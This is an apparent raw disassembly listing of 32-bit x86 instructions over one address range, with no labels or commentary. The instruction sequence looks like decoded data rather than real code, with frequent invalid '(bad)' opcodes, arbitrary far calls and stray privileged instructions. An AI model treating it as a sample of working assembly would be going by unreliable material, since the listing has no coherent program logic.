  4b500e:	add    BYTE PTR [edx],cl
  4b5010:	ins    DWORD PTR es:[edi],dx
  4b5011:	pop    es
  4b5012:	fiadd  WORD PTR [esp+edi*1]
  4b5015:	sub    dl,BYTE PTR [edi+ecx*2]
  4b5018:	push   ecx
  4b5019:	dec    ecx
  4b501a:	jle    0x4b507d
  4b501c:	mov    DWORD PTR [esi+0x1c],ebx
  4b501f:	arpl   ax,ax
  4b5021:	mov    ecx,0x45205488
  4b5026:	call   0x482d:0x5a52064a
  4b502d:	xchg   edi,eax
  4b502e:	push   ss
  4b502f:	lock (bad) 
  4b5031:	cmp    edx,DWORD PTR [esi-0x5ebe5ad9]
  4b5037:	adc    al,0x27
  4b5039:	es xor eax,0xb5233b90
  4b503f:	inc    esp
  4b5040:	dec    ebp
  4b5041:	inc    BYTE PTR [ebp-0x62]
  4b5044:	js     0x4b4ffd
  4b5046:	xchg   edi,eax
  4b5047:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4b5048:	sbb    al,cl
  4b504a:	jne    0x4b504c
  4b504c:	xchg   esp,eax
  4b504d:	xchg   DWORD PTR ds:0x6e89067f,edi
  4b5053:	loope  0x4b503e
  4b5055:	sub    al,0x46
  4b5057:	lds    ebp,FWORD PTR [ebx+0xcc0d422]
  4b505d:	push   0xffffff9e
  4b505f:	push   esi
  4b5060:	pop    ebx
  4b5061:	inc    edx
  4b5062:	sub    al,0xd
  4b5064:	mov    ch,0x17
  4b5066:	push   eax
  4b5067:	cmp    dh,BYTE PTR [edx]
  4b5069:	dec    ebp
  4b506a:	je     0x4b50d3
  4b506c:	test   BYTE PTR [eax+0x3d31801c],0x1d
  4b5073:	jbe    0x4b508a
  4b5075:	test   al,0x97
  4b5077:	and    eax,0x394c4c4d
  4b507c:	js     0x4b50c8
  4b507e:	loope  0x4b5087
  4b5080:	push   ebx
  4b5081:	and    BYTE PTR [ecx-0x66],cl
  4b5084:	add    eax,DWORD PTR [eax]
  4b5086:	jbe    0x4b50ea
  4b5088:	jmp    0x409bacc5
  4b508d:	call   0x983b:0xe2a2428c
  4b5094:	sbb    esp,edx
  4b5096:	xchg   BYTE PTR [ecx],cl
  4b5098:	ss add al,0x80
  4b509b:	mov    bl,0x17
  4b509d:	mov    ds:0x285a5b18,al
  4b50a2:	jne    0x4b507e
  4b50a4:	(bad)
  4b50a7:	push   eax
  4b50a8:	mov    ah,0x37
  4b50aa:	jg     0x4b503a
  4b50ac:	and    al,0xa
  4b50ae:	xchg   DWORD PTR [edx],edx
  4b50b0:	xor    BYTE PTR [edi+0x52],0x80
  4b50b4:	fld    QWORD PTR [eax]
  4b50b6:	in     eax,0x1f
  4b50b8:	mov    esi,0x13c40bd1
  4b50bd:	sbb    DWORD PTR [ebp-0x4fcc3f6a],ecx
  4b50c3:	les    ebx,FWORD PTR [ebx+0x136988c5]
  4b50c9:	xlat   BYTE PTR ds:[ebx]
  4b50ca:	jle    0x5f2eb881
  4b50d0:	fidiv  WORD PTR es:[edi-0x6d61a719]
  4b50d7:	pop    esi
  4b50d8:	jmp    0x4b5154
  4b50da:	fild   DWORD PTR [eax-0x442ffb29]
  4b50e0:	and    eax,0x1e0d687b
  4b50e5:	adc    BYTE PTR [esi+ebx*8-0x32],ch
  4b50e9:	sahf   
  4b50ea:	xchg   edi,eax
  4b50eb:	jmp    0x4b507b
  4b50ed:	inc    ebx
  4b50ee:	adc    al,0xb6
  4b50f0:	dec    ebx
  4b50f1:	bound  ebp,QWORD PTR [edx-0x14]
  4b50f4:	pop    es
  4b50f5:	adc    BYTE PTR [eax+0x60b38d3f],dh
  4b50fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4b50fc:	add    ch,BYTE PTR [eax-0x5f]
  4b50ff:	not    ecx
  4b5101:	inc    eax
  4b5102:	add    esp,DWORD PTR [ecx-0x39]
  4b5105:	sub    al,0x58
  4b5107:	xor    DWORD PTR [eax],ebp
  4b5109:	cmp    al,0x3c
  4b510b:	or     al,0x5b
  4b510d:	sub    DWORD PTR [esp+ecx*1+0x6e822b30],ebp
  4b5114:	arpl   WORD PTR [ebp-0x5c],cx
  4b5117:	test   eax,0xfda4ef6a
  4b511c:	inc    eax
  4b511d:	add    ch,ch
  4b511f:	pop    ebp
  4b5120:	into   
  4b5121:	hlt    
  4b5122:	xchg   edi,eax
  4b5123:	inc    eax
  4b5124:	dec    esp
  4b5125:	push   esp
  4b5126:	and    ebx,DWORD PTR [ebp+0x1c3b0e20]
  4b512c:	scas   eax,DWORD PTR es:[edi]
  4b512d:	xor    DWORD PTR [eax+0x4e8a7d23],0xffffffb5
  4b5134:	dec    ebx
  4b5135:	sub    ecx,DWORD PTR [edi-0xd]
  4b5138:	jns    0x4b514f
  4b513a:	sub    al,0x32
  4b513c:	push   es
  4b513d:	pop    edx
  4b513e:	cmp    DWORD PTR [edx+edi*2],ebp
  4b5141:	pusha  
  4b5142:	cmp    dh,cl
  4b5144:	repz cmp al,0x68
  4b5147:	sbb    BYTE PTR [edx+0x31d21b88],dl
  4b514d:	ins    BYTE PTR es:[edi],dx
  4b514e:	fadd   DWORD PTR [ebx]
  4b5150:	cmp    BYTE PTR [ebp-0x6d],0xb6
  4b5154:	(bad)  
  4b5155:	push   es
  4b5156:	or     BYTE PTR [eax],al
  4b5158:	add    al,0x20
  4b515a:	add    eax,0x8e322607
  4b515f:	ss pop eax
  4b5161:	in     eax,dx
  4b5162:	dec    edx
  4b5163:	sbb    al,0x6a
  4b5165:	push   eax
  4b5166:	popf   
  4b5167:	pop    ecx
  4b5168:	loope  0x4b5175
  4b516a:	push   edi
  4b516b:	sbb    esp,DWORD PTR [esi-0x1cf79b0f]
  4b5171:	add    BYTE PTR [eax],bl
  4b5173:	pop    eax
  4b5174:	cwde   
  4b5175:	push   edx
  4b5176:	pusha  
  4b5177:	pop    ds
  4b5178:	ret    0x976
  4b517b:	(bad)  
  4b517c:	imul   eax,DWORD PTR [esp+0x34],0x2c705e09
  4b5184:	jmp    0x59761
  4b5189:	mov    dl,0x4d
  4b518b:	cmp    al,0xa
  4b518d:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4b518f:	push   ebp
  4b5190:	push   0xffffff81
  4b5192:	cli    
  4b5193:	aaa    
  4b5194:	fwait
  4b5195:	mov    es,WORD PTR [eax-0x49055cff]
  4b519b:	je     0x4b51f7
  4b519d:	ss test dh,dh
  4b51a0:	or     dh,BYTE PTR [eax]
  4b51a2:	call   0xcc05:0xc75a9dc0
  4b51a9:	fwait
  4b51aa:	aam    0x86
  4b51ac:	adc    cl,ah
  4b51ae:	shl    BYTE PTR [esi+0x488c706e],1
  4b51b4:	mov    ds:0xc589e131,eax
  4b51b9:	out    dx,eax
  4b51ba:	mov    dh,0x6
  4b51bc:	rcr    DWORD PTR [esi+0x74],1
  4b51bf:	cdq    
  4b51c0:	mov    ds:0x680e19d8,eax
  4b51c5:	daa    
  4b51c6:	pop    es
  4b51c7:	or     eax,0x438a5af7
  4b51cc:	call   0xe0c2f2ea
  4b51d1:	push   ebx
  4b51d2:	rol    BYTE PTR [edi+0x713beecb],0x2a
  4b51d9:	sub    al,0xa0
  4b51db:	push   ds
  4b51dc:	adc    ah,BYTE PTR [ecx]
  4b51de:	mov    DWORD PTR [ebx],eax
  4b51e0:	sbb    bh,cl
  4b51e2:	xchg   edx,eax
  4b51e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4b51e4:	(bad)
  4b51e7:	mov    eax,ds:0x4b3964e1
  4b51ec:	pop    ds
  4b51ed:	jbe    0x4b5222
  4b51ef:	sub    bh,ah
  4b51f1:	aas    
  4b51f2:	adc    BYTE PTR [esi+0x2989c067],bh
  4b51f8:	loopne 0x4b517a
  4b51fa:	jne    0x4b5232
  4b51fc:	outs   dx,DWORD PTR ds:[esi]
  4b51fd:	jbe    0x4b5259
  4b51ff:	xor    al,BYTE PTR [edx-0x3e]
  4b5202:	rol    BYTE PTR [esi],1
  4b5204:	xchg   ebx,eax
  4b5205:	add    ah,bh
  4b5207:	add    eax,0x6c689934
  4b520c:	xchg   edi,eax
  4b520d:	icebp  
  4b520e:	add    DWORD PTR ds:0x40a9b8d8,ebx
  4b5214:	rol    ah,1
  4b5216:	add    DWORD PTR [eax],0x55
  4b5219:	adc    BYTE PTR [eax+0x336feb6e],dl
  4b521f:	fs mov edi,0x7af62b5
  4b5225:	mov    eax,0xed08d099
  4b522a:	or     DWORD PTR [ebx+ebx*4+0x40],ecx
  4b522e:	jb     0x4b52a2
  4b5230:	xor    al,0xd9
  4b5232:	dec    esp
  4b5233:	and    BYTE PTR [ecx+edi*4],al
  4b5236:	add    al,cl
  4b5238:	dec    esp
  4b5239:	xchg   eax,esp
  4b523b:	call   0x8185:0xb353911a
  4b5242:	aam    0x68
  4b5244:	cmc    
  4b5245:	fxch   st(0)
  4b5247:	push   ebx
  4b5248:	imul   esp,DWORD PTR [eax+0x77],0xc48ce705
  4b524f:	or     al,0x80
  4b5251:	push   eax
  4b5252:	dec    ebx
  4b5253:	test   DWORD PTR [eax],esp
  4b5255:	adc    BYTE PTR [edx],bl
  4b5257:	pop    eax
  4b5258:	popa   
  4b5259:	dec    edx
  4b525a:	add    esp,DWORD PTR [edi-0x1d]
  4b525d:	push   ebx
  4b525e:	push   es
  4b525f:	icebp  
  4b5260:	or     eax,0x98a9005b
  4b5265:	jp     0x4b51e9
  4b5267:	or     edi,edx
  4b5269:	mov    al,ds:0x6c8e522b
  4b526e:	jmp    0x4b5279
  4b5270:	bound  ecx,QWORD PTR [edi+eax*1+0x2e]
  4b5274:	mov    ?,WORD PTR [eax-0x23ebf90c]
  4b527a:	lods   eax,DWORD PTR ds:[esi]
  4b527b:	mov    dl,0x1b
  4b527d:	int3   
  4b527e:	es scas eax,DWORD PTR es:[edi]
  4b5280:	inc    edx
  4b5281:	adc    al,0x6e
  4b5283:	enter  0x570d,0xdc
  4b5287:	stc    
  4b5288:	bound  edx,QWORD PTR [esi]
  4b528a:	mov    ecx,DWORD PTR [eax+0x31]
  4b528d:	sub    edx,esp
  4b528f:	cmp    eax,0x234d501
  4b5294:	in     eax,0xb
  4b5296:	mov    eax,ds:0x8d5060d5
  4b529b:	fsubr  DWORD PTR [si-0x37]
  4b529f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4b52a0:	add    esi,0xd2164e40
  4b52a6:	mov    bh,0x36
  4b52a8:	int    0x74
  4b52aa:	cmovs  esi,DWORD PTR [ebp+0x34]
  4b52ae:	lock dec eax
  4b52b0:	pop    edx
  4b52b1:	dec    ecx
  4b52b2:	lods   al,BYTE PTR ds:[esi]
  4b52b3:	enter  0xeb5e,0xe
  4b52b7:	adc    ch,0xd7
  4b52ba:	(bad)  
  4b52bc:	adc    BYTE PTR [edi-0x62],0xad
  4b52c0:	add    eax,0xebf032e4
  4b52c5:	test   al,0x15
  4b52c7:	mov    ss,edx
  4b52c9:	inc    esp
  4b52ca:	mov    eax,0x1a122d47
  4b52cf:	mov    DWORD PTR [ebp-0x50fbb06a],0x13e16d57
  4b52d9:	or     ebx,DWORD PTR ds:0x2140c610
  4b52df:	and    al,0xc1
  4b52e1:	push   ecx
  4b52e2:	pop    ecx
  4b52e3:	js     0x4b527b
  4b52e5:	rcr    al,1
  4b52e7:	mov    DWORD PTR [edx+0x8fe580a],edx
  4b52ed:	mov    edx,DWORD PTR [eax]
  4b52ef:	mov    esi,DWORD PTR [eax+0x4]
  4b52f2:	out    0xa1,al
  4b52f4:	mov    bl,0x81
  4b52f6:	inc    esi
  4b52f7:	xchg   ebx,eax
  4b52f8:	(bad)  
  4b52f9:	cmp    eax,0x12782954
  4b52fe:	out    0x40,al
  4b5300:	je     0x4b5315
  4b5302:	imul   ecx,DWORD PTR [eax-0x156dec74],0xa38004ba
  4b530c:	adc    bh,bl
  4b530e:	pop    es
  4b530f:	adc    DWORD PTR [esi+0x18],ebp
  4b5312:	xor    eax,0x81b04c33
  4b5317:	(bad)  
  4b5318:	fistp  QWORD PTR [ecx+ebp*1]
  4b531b:	add    al,0x9c
  4b531d:	scas   eax,DWORD PTR es:[edi]
  4b531e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4b531f:	dec    edi
  4b5320:	and    al,0xe8
  4b5322:	pop    edx
  4b5323:	adc    bh,al
  4b5325:	sub    BYTE PTR [eax],0xd0
  4b5328:	ins    BYTE PTR es:[edi],dx
  4b5329:	sbb    BYTE PTR [esi],0x90
  4b532c:	jge    0x4b52c8
  4b532e:	and    dl,BYTE PTR [ebx-0x4f6be548]
  4b5334:	aam    0xbb
  4b5336:	out    dx,al
  4b5337:	push   ebp
  4b5338:	xchg   esi,eax
  4b5339:	push   ecx
  4b533a:	in     al,0xd8
  4b533c:	dec    ecx
  4b533d:	pop    esi
  4b533e:	stos   DWORD PTR es:[edi],eax
  4b533f:	(bad)  
  4b5340:	call   FWORD PTR [edi+0x7745108]
  4b5346:	jp     0x4b53ac
  4b5348:	jle    0x4b53a2
  4b534a:	or     eax,esp
  4b534c:	jb     0x4b532e
  4b534e:	dec    eax
  4b534f:	or     al,0x2b
  4b5351:	(bad)  
  4b5352:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4b5353:	test   BYTE PTR [edx-0x198082eb],al
  4b5359:	dec    edx
  4b535a:	and    eax,0x9bdd4238
  4b535f:	or     DWORD PTR [ebx+0x1],0x2e10c237
  4b5366:	push   esi
  4b5367:	rol    BYTE PTR [ebx+0x525e9a60],cl
  4b536d:	mov    fs,WORD PTR ds:0x7820b516
  4b5373:	sbb    ebx,DWORD PTR [edi-0x2f]
  4b5376:	cmp    bh,ah
  4b5378:	int3   
  4b5379:	fs dec eax
  4b537b:	jne    0x4b535e
  4b537d:	inc    edi
  4b537e:	cli    
  4b537f:	inc    eax
  4b5380:	call   0x5451:0xb43f9691
  4b5387:	push   edx
  4b5388:	lahf   
  4b5389:	add    dl,dh
  4b538b:	shl    BYTE PTR [edx+edx*1+0x71],0x42
  4b5390:	loop   0x4b53ad
  4b5392:	add    edx,DWORD PTR [esi+0x5f]
  4b5395:	and    al,0x63
  4b5397:	in     al,dx
  4b5398:	nop
  4b5399:	push   ds
  4b539a:	sbb    al,0x32
  4b539c:	fist   DWORD PTR [ebx+0x69d18148]
  4b53a2:	or     al,0x11
  4b53a4:	lahf   
  4b53a5:	or     al,ch
  4b53a7:	sbb    al,0x61
  4b53a9:	adc    BYTE PTR [eax-0x59],bl
  4b53ac:	fadd   DWORD PTR [edx]
  4b53ae:	pusha  
  4b53af:	and    eax,0xac1ab633
  4b53b4:	pop    ebx
  4b53b5:	ffreep st(0)
  4b53b7:	dec    ecx
  4b53b8:	sti    
  4b53b9:	retf   0xa58
  4b53bc:	sbb    BYTE PTR [eax+0x36001d71],ch
  4b53c2:	aas    
  4b53c3:	fist   WORD PTR [eax]
  4b53c5:	iret   
  4b53c6:	shr    BYTE PTR [edx+0x20],1
  4b53c9:	retf   
  4b53ca:	push   edi
  4b53cb:	sub    al,ah
  4b53cd:	sbb    al,0x4b
  4b53cf:	cwde   
  4b53d0:	sbb    BYTE PTR [edi-0x2cc1c4a3],cl
  4b53d6:	or     DWORD PTR [ebx],ebp
  4b53d8:	add    BYTE PTR [edx],ah
  4b53da:	cs push cs
  4b53dc:	mov    eax,ds:0xb930ba43
  4b53e1:	cmp    bh,BYTE PTR fs:[esi+0x5633bd1d]
  4b53e8:	push   edx
  4b53e9:	jp     0x4b53a3
  4b53eb:	xor    dh,BYTE PTR [eax+0x24]
  4b53ee:	call   0x14e416fe
  4b53f3:	pop    eax
  4b53f4:	cmp    al,0x84
  4b53f6:	xlat   BYTE PTR ds:[ebx]
  4b53f7:	or     BYTE PTR [eax-0x39adb082],al
  4b53fd:	les    esi,FWORD PTR [ecx+esi*4]
  4b5400:	cdq    
  4b5401:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4b5402:	jo     0x4b538c
  4b5404:	ja     0x4b544a
  4b5406:	mov    dh,0x46
  4b5408:	push   ds
  4b5409:	pop    esi
  4b540a:	jle    0x4b5476
  4b540c:	cmp    al,0x57
  4b540e:	or     eax,0xdc31259c
  4b5413:	add    eax,DWORD PTR [edx+0x10]
  4b5416:	pop    ecx
  4b5417:	xchg   DWORD PTR [eax-0x62],edx
  4b541a:	sub    ebp,DWORD PTR [edx+edx*2]
  4b541d:	push   edx
  4b541e:	ficomp WORD PTR [edi]
  4b5420:	arpl   WORD PTR [edi],cx
  4b5422:	mov    ecx,0x51404c66
  4b5427:	dec    ebp
  4b5428:	sub    BYTE PTR [esi+eax*1],ah
  4b542b:	push   es
  4b542c:	add    eax,DWORD PTR [eax+0x62dd19e1]
  4b5432:	add    al,0x20
  4b5434:	sub    BYTE PTR [ecx+0x2d6bed4b],0x1d
  4b543b:	pop    ecx
  4b543c:	pop    ss
  4b543d:	cs xchg edi,eax
  4b543f:	rol    BYTE PTR [ebx-0x529c2291],cl
  4b5445:	out    dx,eax
  4b5446:	inc    eax
  4b5447:	in     al,dx
  4b5448:	or     cl,ah
  4b544a:	je     0x4b5408
  4b544c:	xor    esp,DWORD PTR [ecx]
  4b544e:	jb     0x4b545d
  4b5450:	enter  0xc20b,0x9a
  4b5454:	popf   
  4b5455:	cdq    
  4b5456:	pop    ss
  4b5457:	test   BYTE PTR ds:0x1472c700,ch
  4b545d:	jnp    0x4b54c8
  4b545f:	adc    BYTE PTR [esi+0x12b5c4b],bh
  4b5465:	push   0x40
  4b5467:	arpl   ax,sp
  4b5469:	mov    WORD PTR [esi+0xdec1ac0],es
  4b546f:	inc    ebp
  4b5470:	loopne 0x4b53f3
  4b5472:	push   0x28f576c0
  4b5477:	inc    ebx
  4b5478:	or     DWORD PTR [ecx+ecx*4+0x6e],ebx
  4b547c:	sar    DWORD PTR [edx+0x5a0acc00],cl
  4b5482:	sub    eax,0xdfed83cd
  4b5487:	xor    esi,esi
  4b5489:	push   es
  4b548a:	jmp    0x4b54a0
  4b548c:	fist   DWORD PTR [edx+edx*2+0x31]
  4b5490:	hlt    
  4b5491:	add    al,0xd4
  4b5493:	and    al,dh
  4b5495:	jnp    0x4b54d3
  4b5497:	add    edi,DWORD PTR [ebx+0x1464c3]
  4b549d:	hlt    
  4b549e:	lods   al,BYTE PTR ds:[esi]
  4b549f:	push   cs
  4b54a0:	push   esp
  4b54a1:	icebp  
  4b54a2:	or     DWORD PTR [ecx-0x11ae0ff8],ebp
  4b54a8:	push   ebx
  4b54a9:	and    ch,bh
  4b54ab:	fdivrp st(6),st
  4b54ad:	jp     0x4b54f3
  4b54af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4b54b0:	sub    BYTE PTR cs:[eax-0x208cc4c0],cl
  4b54b7:	add    dh,BYTE PTR [eax+0x55]
  4b54ba:	sub    bl,BYTE PTR [ebx-0x3cac2f43]
  4b54c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4b54c1:	or     DWORD PTR [ebp-0x57],esp
  4b54c4:	push   ebp
  4b54c5:	(bad)  
  4b54c6:	loope  0x4b54ee
  4b54c8:	imul   ebx,DWORD PTR [eax],0xcaff245a
  4b54ce:	(bad)  
  4b54cf:	sub    cl,BYTE PTR [eax+eax*2]
  4b54d2:	xor    bl,BYTE PTR [edx]
  4b54d4:	call   0x215:0xa50bde39
  4b54db:	jne    0x4b5471
  4b54dd:	adc    al,0x2b
  4b54df:	into   
  4b54e0:	push   ecx
  4b54e1:	push   esi
  4b54e2:	pushf  
  4b54e3:	dec    eax
  4b54e4:	outs   dx,BYTE PTR ds:[esi]
  4b54e5:	sub    BYTE PTR [ebx],ch
  4b54e7:	les    edi,FWORD PTR [edi+0x30]
  4b54ea:	lea    ecx,[edi-0x56f0f339]
  4b54f0:	mov    eax,ds:0x48a89acc
  4b54f5:	push   es
  4b54f6:	sbb    DWORD PTR [esi+0x4030a330],ecx
  4b54fc:	mov    bl,BYTE PTR [eax+0x6c]
  4b54ff:	imul   ebp,DWORD PTR [ebx],0x62
  4b5502:	jmp    0x4b54a9
  4b5504:	sbb    al,0xd6
  4b5506:	sub    eax,0xf5ffa5e3
  4b550b:	loop   0x4b5513
  4b550d:	rol    DWORD PTR [edi],0x93
  4b5510:	sahf   
  4b5511:	test   eax,0xc60b3b79
  4b5516:	and    bh,BYTE PTR [esi]
  4b5518:	cmp    eax,esi
  4b551a:	lods   al,BYTE PTR ds:[esi]
  4b551b:	push   0x2f41c780
  4b5520:	xchg   BYTE PTR [eax],ch
  4b5522:	mov    ebx,0x89e130a4
  4b5527:	pop    edx
  4b5528:	push   esi
  4b5529:	pop    edi
  4b552a:	aad    0x32
  4b552c:	jb     0x4b54d6
  4b552e:	push   edx
  4b552f:	or     eax,0x103dd93d
  4b5534:	inc    ebx
  4b5535:	adc    cl,dl
  4b5537:	(bad)  
  4b5539:	dec    ebx
  4b553a:	pop    eax
  4b553b:	je     0x4b54f6
  4b553d:	fisttp WORD PTR [ebx-0x8]
  4b5540:	adc    eax,0xe6ff21c
  4b5545:	std    
  4b5546:	mul    edx
  4b5548:	imul   DWORD PTR [ebx]
  4b554a:	dec    BYTE PTR [ebx-0x7bceac39]
  4b5550:	push   ebp
  4b5551:	sti    
  4b5552:	push   edi
  4b5553:	push   esi
  4b5554:	loope  0x4b54f1
  4b5556:	or     BYTE PTR [eax+ecx*1],ah
  4b5559:	inc    esi
  4b555a:	ret    
  4b555b:	sub    eax,0xd6d0bde0
  4b5560:	or     BYTE PTR [ecx+esi*8-0x1f93beff],cl
  4b5567:	into   
  4b5568:	pop    esp
  4b5569:	pop    edi
  4b556a:	sub    BYTE PTR [ebp+0x52],cl
  4b556d:	clc    
  4b556e:	push   edi
  4b556f:	or     BYTE PTR [ebp+0x3b],dh
  4b5572:	repz jg 0x4b55df
  4b5575:	add    BYTE PTR [ebx-0x7d],ah
  4b5578:	add    al,0x33
  4b557a:	mov    esi,ebx
  4b557c:	jmp    0x4b55f6
  4b557e:	sub    BYTE PTR ds:0xce74c33d,al
  4b5584:	rol    BYTE PTR [esi+ecx*2],cl
  4b5587:	je     0x4b55e0
  4b5589:	dec    esp
  4b558a:	fimul  WORD PTR [ebx+0x580a65c3]
  4b5590:	xor    eax,0x548285ec
  4b5595:	xor    ebx,esp
  4b5597:	mov    esp,ecx
  4b5599:	dec    ebx
  4b559a:	icebp  
  4b559b:	push   edx
  4b559c:	test   DWORD PTR [edi-0x2efce024],ebx
  4b55a2:	ss mov ah,cl
  4b55a5:	and    bh,BYTE PTR [eax+0x51]
  4b55a8:	in     eax,dx
  4b55a9:	rcl    BYTE PTR [edx-0x498a2b7a],cl
  4b55af:	imul   edi,edx,0x9f943d4e
  4b55b5:	(bad)  
  4b55b7:	push   ds
  4b55b8:	cmp    eax,edi
  4b55ba:	(bad)  
  4b55bb:	mov    edx,DWORD PTR [esi-0x3c]
  4b55be:	pusha  
  4b55bf:	xor    eax,0x85d18890
  4b55c4:	rcl    BYTE PTR [esp+edi*1],0xd5
  4b55c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4b55c9:	mov    esi,0x78736eda
  4b55ce:	mov    ebx,0xcba6a5be
  4b55d3:	sub    BYTE PTR [esi+0x2b],dl
  4b55d6:	push   0x57
  4b55d8:	push   ebx
  4b55d9:	xchg   ebp,eax
  4b55da:	inc    esp
  4b55db:	popa   
  4b55dc:	ror    DWORD PTR [ebx],0x91
  4b55df:	neg    DWORD PTR [eax]
  4b55e1:	aaa    
  4b55e2:	adc    BYTE PTR [esi-0x4aef8a48],dh
  4b55e8:	push   0x1a1dc460
  4b55ed:	clc    
  4b55ee:	imul   eax,DWORD PTR ds:0x2c5a3356,0x2762f010
  4b55f8:	pop    edi
  4b55f9:	mov    ebx,0xc0b78a2b
  4b55fe:	mov    eax,0x1c009d30
  4b5603:	mov    eax,0xb4fc2457
  4b5608:	sub    eax,0x213a15fd
  4b560d:	mov    ah,0x31
  4b560f:	xchg   ebx,eax
  4b5610:	jp     0x4b563e
  4b5612:	pushf  
  4b5613:	outs   dx,BYTE PTR ds:[esi]
  4b5614:	inc    ecx
  4b5615:	sar    BYTE PTR [ebx+0x8],0xf7
  4b5619:	adc    BYTE PTR [eax+0x68],ch
  4b561c:	les    esp,FWORD PTR [esi+0x31811b73]
  4b5622:	sub    dh,BYTE PTR [ecx]
  4b5624:	dec    ebp
  4b5625:	dec    ebp
  4b5626:	gs inc eax
  4b5628:	sahf   
  4b5629:	nop
  4b562a:	push   ecx
  4b562b:	cmp    edx,DWORD PTR [ebp-0x64]
  4b562e:	xchg   edx,eax
  4b562f:	fild   DWORD PTR [eax-0x6af9adc4]
  4b5635:	shl    ah,0x90
  4b5638:	mov    WORD PTR [ebp*8+0xb8cc00],ds
  4b563f:	nop
  4b5640:	and    eax,DWORD PTR [edi+0x9ff464]
  4b5646:	add    ch,al
  4b5648:	fld    QWORD PTR [ebx]
  4b564a:	fnstcw WORD PTR ds:0x248d6e75
  4b5650:	lds    esi,FWORD PTR [ebp+0x59]
  4b5653:	test   DWORD PTR [eax],esi
  4b5655:	pop    ss
  4b5656:	sar    BYTE PTR ds:0x2875c590,cl
  4b565c:	jge    0x4b56a6
  4b565e:	adc    esp,DWORD PTR [edx+0x13]
  4b5661:	js     0x4b569b
  4b5663:	and    ecx,DWORD PTR [ecx+0x9]
  4b5666:	jmp    0x4901:0x11eb0b6
  4b566d:	push   cs
  4b566e:	sbb    esi,esi
  4b5670:	aaa    
  4b5671:	mov    al,0x1
  4b5673:	(bad)  
  4b5674:	test   BYTE PTR [ecx+0x4],ah
  4b5677:	(bad)
  4b567b:	jb     0x4b5631
  4b567d:	xor    BYTE PTR [edi],0x45
  4b5680:	add    BYTE PTR ds:0xf9226414,al
  4b5686:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4b5687:	add    BYTE PTR [edx],al
  4b5689:	or     al,0x52
  4b568b:	imul   esp,DWORD PTR [edx*1+0x42122bb7],0xf0c0501
  4b5696:	adc    BYTE PTR [ebx-0x1d],ch
  4b5699:	sub    ch,BYTE PTR ds:0x60720272
  4b569f:	push   edx
  4b56a0:	mov    bh,0xe4
  4b56a2:	mov    ebx,0x5ccb1481
  4b56a7:	jne    0x4b56f9
  4b56a9:	push   ds
  4b56aa:	xor    DWORD PTR [eax+0x3],0x932640a2
  4b56b1:	ds inc ebp
  4b56b3:	jl     0x4b5638
  4b56b5:	ja     0x4b56ba
  4b56b7:	or     ah,BYTE PTR [edi]
  4b56b9:	icebp  
  4b56ba:	or     eax,0x2e10951a
  4b56bf:	sbb    ch,bl
  4b56c1:	xchg   DWORD PTR [ebp-0x3244ea0c],eax
  4b56c7:	push   ss
  4b56c8:	adc    eax,0x9e215df4
  4b56cd:	inc    esi
  4b56ce:	add    DWORD PTR [ecx+0x65],edx
  4b56d1:	jmp    0x4b56e5
  4b56d3:	mov    eax,ds:0x58297b9
  4b56d8:	adc    DWORD PTR [edi-0x77],0x1d
  4b56dc:	aam    0xf2
  4b56de:	retf   0xc4d
  4b56e1:	inc    ebp
  4b56e2:	adc    al,0x50
  4b56e4:	push   ecx
  4b56e5:	scas   al,BYTE PTR es:[edi]
  4b56e6:	sub    esi,DWORD PTR [edi]
  4b56e8:	mov    edx,0x4ad6f023
  4b56ed:	push   edx
  4b56ee:	inc    esi
  4b56ef:	test   al,0x2b
  4b56f1:	push   esi
  4b56f2:	aaa    
  4b56f3:	cs jecxz 0x4b5734
  4b56f6:	fdivr  QWORD PTR [ebx-0xf]
  4b56f9:	les    ecx,FWORD PTR [ebx-0x2cb730fb]
  4b56ff:	in     al,0x1c
  4b5701:	adc    al,0x75
  4b5703:	call   0x2b0f5901
  4b5708:	dec    ecx
  4b5709:	push   edi
  4b570a:	and    dh,dl
  4b570c:	sub    al,ah
  4b570e:	xchg   ebp,eax
  4b570f:	inc    edi
  4b5710:	popa   
  4b5711:	and    eax,0x4dab0de9
  4b5716:	in     al,dx
  4b5717:	mov    bl,0x97
  4b5719:	lea    ebp,[ecx-0x60]
  4b571c:	in     eax,0xfe
  4b571e:	sti    
  4b571f:	mov    edx,0x4f480170
  4b5724:	call   0x3e2:0x792c003f
  4b572b:	pop    edi
  4b572c:	add    eax,0x2b8821dd
  4b5731:	mov    eax,ds:0x78ae5474
  4b5736:	or     edx,DWORD PTR ds:0x9d44a554
  4b573c:	push   0xed2ffa30
  4b5741:	ds push edx
  4b5743:	add    eax,edi
  4b5745:	push   cs
  4b5746:	or     bh,ah
  4b5748:	add    bl,bh
  4b574a:	idiv   DWORD PTR [ecx+0x8042a5c]
  4b5750:	or     al,0xa1
  4b5752:	ins    BYTE PTR es:[edi],dx
  4b5753:	popa   
  4b5754:	pop    esp
  4b5755:	mov    esi,0xfb1ce46f
  4b575a:	and    dh,BYTE PTR [ecx]
  4b575c:	or     ebp,DWORD PTR es:[edx]
  4b575f:	cs pop esp
  4b5761:	sub    ch,ch
  4b5763:	mov    ecx,0x36626632
  4b5768:	fadd   DWORD PTR [ebx+ecx*8-0x1b]
  4b576c:	mov    ebx,0xb4c489c
  4b5771:	push   eax
  4b5772:	push   esp
  4b5773:	outs   dx,BYTE PTR ds:[esi]
  4b5774:	and    al,0x52
  4b5776:	xchg   edi,eax
  4b5777:	pop    eax
  4b5778:	pop    esp
  4b5779:	pop    ecx
  4b577a:	add    eax,0xbd9c553c
  4b577f:	(bad)  
  4b5781:	fs (bad) 
  4b5783:	hlt    
  4b5784:	cli    
  4b5785:	sbb    DWORD PTR ds:0x70967e70,ecx
  4b578b:	adc    DWORD PTR [ebp-0x5a20d1e8],0x72d46ee0
  4b5795:	std    
  4b5796:	jbe    0x4b5812
  4b5798:	aaa    
